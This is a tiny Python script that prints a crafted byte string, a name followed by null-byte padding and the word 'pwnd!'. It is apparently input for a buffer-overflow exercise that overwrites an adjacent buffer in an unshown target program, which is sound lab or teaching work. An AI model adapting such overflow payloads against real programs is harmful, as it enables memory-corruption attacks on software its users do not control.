import sys

sys.stdout.buffer.write(b"Borui" + b"\x00"+b"\x00"+b"\x00"+b"\x00" + b"\x00" +b"pwnd!" + b"\x00")
